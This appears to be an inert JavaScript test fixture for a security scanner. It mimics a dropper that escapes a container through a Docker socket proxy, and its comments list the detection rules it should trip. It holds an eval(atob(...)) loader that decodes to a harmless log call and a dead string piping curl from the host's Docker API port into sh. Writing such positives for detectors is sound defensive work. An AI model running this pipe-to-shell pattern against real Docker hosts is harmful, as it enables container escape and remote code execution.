// DETECTION TEST FIXTURE -- inert payload, never deploy this file.
//
// Same intent as eva_dockerproxy_01.js (tenant -> host docker-socket-proxy
// escape), but written the way a NAIVE attacker stages a dropper: hand-
// obfuscated with exactly the tokens the heuristic rules target. Included so
// the scanner has an in-language (Node runtime) positive for the escape class.
//
// Why it is BLOCKED (expected: detect / predicted: caught):
//   three rule hits stack past the block threshold (configs/detection-rules/):
//     - JS-EVAL-ATOB            (HIGH,   40)  eval(atob(...))
//     - SUSPICIOUS-CURL-PIPE-SH (HIGH,   40)  curl ... | sh
//     - DYNAMIC-FUNC-CREATE     (MEDIUM, 20)  new Function(...)
//   total 100 >= BLOCK_THRESHOLD (risk-engine.service.ts) -> BLOCK, no deploy.
//
// Kept inert: the base64 below decodes to `console.log("ok")`, and the
// pipe-to-shell line is a dead string (never executed). Running this file
// does nothing harmful.

// stage-1 loader: decode + eval  --> trips JS-EVAL-ATOB
eval(atob('Y29uc29sZS5sb2coIm9rIik=')); // == console.log("ok")

// stage-2 fetch, as a plain string the rule still matches --> SUSPICIOUS-CURL-PIPE-SH
const stage2 = 'curl http://172.18.0.1:2375/containers/json | sh'; // dead string
void stage2;

// dynamic dispatcher --> DYNAMIC-FUNC-CREATE
const dispatch = new Function('x', 'return x'); // inert
dispatch('ok');
